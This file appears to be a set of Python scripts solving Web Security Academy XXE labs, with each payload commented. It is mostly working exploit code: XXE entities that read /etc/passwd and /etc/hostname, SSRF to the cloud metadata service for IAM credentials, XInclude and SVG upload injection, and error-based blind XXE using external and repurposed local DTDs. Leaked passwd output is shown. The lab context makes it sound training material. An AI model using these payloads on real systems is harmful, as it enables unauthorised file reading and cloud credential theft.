###

# <?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE zoz [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>


import requests

burp0_url = "https://ac8b1fb21e274369c089283f00bc00fc.web-security-academy.net:443/product/stock"
burp0_cookies = {"session": "KN5LlaJLDTDCIxx64Ce5wHHxoCarofto"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://ac8b1fb21e274369c089283f00bc00fc.web-security-academy.net/product?productId=3", "Content-Type": "application/xml", "Origin": "https://ac8b1fb21e274369c089283f00bc00fc.web-security-academy.net", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
burp0_data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE zoz [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\r\n<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>\r\n\r\n\r\n"
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)



###

# <?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE foo [ <!ENTITY zoz SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/\"> ]>

import requests

burp0_url = "https://ac7e1fac1f838b12c0724377001b00b5.web-security-academy.net:443/product/stock"
burp0_cookies = {"session": "CMnSesCXxMi7P6wl7FcfUhMZgz4YQlpi"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://ac7e1fac1f838b12c0724377001b00b5.web-security-academy.net/product?productId=2", "Content-Type": "application/xml", "Origin": "https://ac7e1fac1f838b12c0724377001b00b5.web-security-academy.net", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
burp0_data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE foo [ <!ENTITY zoz SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/\"> ]> \r\n<stockCheck><productId>\r\n&zoz;</productId><storeId>1</storeId></stockCheck>"
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

######

######

# <foo xmlns:xi="http://www.w3.org/2001/XInclude">
# <xi:include parse="text" href="file:///etc/passwd"/>
# </foo>

import requests

burp0_url = "https://ac631fb41f66f36cc01e82b4006e000e.web-security-academy.net:443/product/stock"
burp0_cookies = {"session": "RUNqyNLDHmjNeipBTpW7PrMXzs31MTLX"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://ac631fb41f66f36cc01e82b4006e000e.web-security-academy.net/product?productId=1", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://ac631fb41f66f36cc01e82b4006e000e.web-security-academy.net", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
burp0_data = {"productId": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">\r\n<xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo> ", "storeId": "1"}
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

######



####

# SVG


<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>


import requests

burp0_url = "https://acba1f6c1f8a8931c04e0e1b00bc0081.web-security-academy.net:443/post/comment"
burp0_cookies = {"session": "pGGFQyPOiltoXhJv4BvwkCFhcBI90kmS"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------337649460729596555071464517607", "Origin": "https://acba1f6c1f8a8931c04e0e1b00bc0081.web-security-academy.net", "Dnt": "1", "Referer": "https://acba1f6c1f8a8931c04e0e1b00bc0081.web-security-academy.net/post?postId=2", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
burp0_data = "-----------------------------337649460729596555071464517607\r\nContent-Disposition: form-data; name=\"csrf\"\r\n\r\noBsajWlVv8KOEx2K4I1CQVzcf5gNqzqq\r\n-----------------------------337649460729596555071464517607\r\nContent-Disposition: form-data; name=\"postId\"\r\n\r\n2\r\n-----------------------------337649460729596555071464517607\r\nContent-Disposition: form-data; name=\"comment\"\r\n\r\nxxe\r\n-----------------------------337649460729596555071464517607\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nbobsponge\r\n-----------------------------337649460729596555071464517607\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"92313d893b4f9462b2ba42842f965974.svg\"\r\nContent-Type: image/svg+xml\r\n\r\n<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg> \r\n\r\n-----------------------------337649460729596555071464517607\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\nbob@myhome.com\r\n-----------------------------337649460729596555071464517607\r\nContent-Disposition: form-data; name=\"website\"\r\n\r\n\r\n-----------------------------337649460729596555071464517607--\r\n"
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)


####

# <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
# "http://exploit-ac521f121e07f3e5c05d553901360034.web-security-academy.net/exploit"> %xxe;]>


import requests

burp0_url = "https://ac1d1f291e7df395c0d255dc007e000c.web-security-academy.net:443/product/stock"
burp0_cookies = {"session": "QfrGj02TiUMeffvNVBg8JPrkf734BM8i"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://ac1d1f291e7df395c0d255dc007e000c.web-security-academy.net/product?productId=3", "Content-Type": "application/xml", "Origin": "https://ac1d1f291e7df395c0d255dc007e000c.web-security-academy.net", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
burp0_data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM\r\n\"http://exploit-ac521f121e07f3e5c05d553901360034.web-security-academy.net/exploit\"> %xxe;]> \r\n<stockCheck><productId>\r\n2</productId><storeId>1</storeId></stockCheck>"
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)


# at url: http://exploit-ac521f121e07f3e5c05d553901360034.web-security-academy.net/exploit :

# <!ENTITY % file SYSTEM "file:///etc/passwd">
# <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
# %eval;
# %exfil;


# response:

# HTTP/1.1 400 Bad Request
# Content-Type: application/json; charset=utf-8
# Connection: close
# Content-Length: 1339
#
# "XML parser exited with non-zero code 1: /nonexistent/root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# bin:x:2:2:bin:/bin:/usr/sbin/nologin
# ...

######

# blind xxe: expert


# check if file exist:

# <!DOCTYPE foo [
# <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
# %local_dtd;
# ]>


# send in request:

# <!DOCTYPE foo [
# <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
# <!ENTITY % ISOamso '
# <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
# <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
# &#x25;eval;
# &#x25;error;
# '>
# %local_dtd;
# ]>

import requests

burp0_url = "https://acbe1f321e5233f6c03ddd940029004e.web-security-academy.net:443/product/stock"
burp0_cookies = {"session": "dQYtfgN6zucFyYoz6PCu5Jt4oAw5CjWa"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://acbe1f321e5233f6c03ddd940029004e.web-security-academy.net/product?productId=5", "Content-Type": "application/xml", "Origin": "https://acbe1f321e5233f6c03ddd940029004e.web-security-academy.net", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
burp0_data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE foo [\r\n<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\r\n<!ENTITY % ISOamso '\r\n<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">\r\n<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">\r\n&#x25;eval;\r\n&#x25;error;\r\n'>\r\n%local_dtd;\r\n]> \r\n<stockCheck><productId>5</productId><storeId>1</storeId></stockCheck>"
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)


# error msg in response:

# HTTP/1.1 400 Bad Request
# Content-Type: application/json; charset=utf-8
# Connection: close
# Content-Length: 1339
#
# "XML parser exited with non-zero code 1: /nonexistent/root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# bin:x:2:2:bin:/bin:/usr/sbin/nologin
# sys:x:3:3:sys:/dev:/usr/sbin/nolog
# ....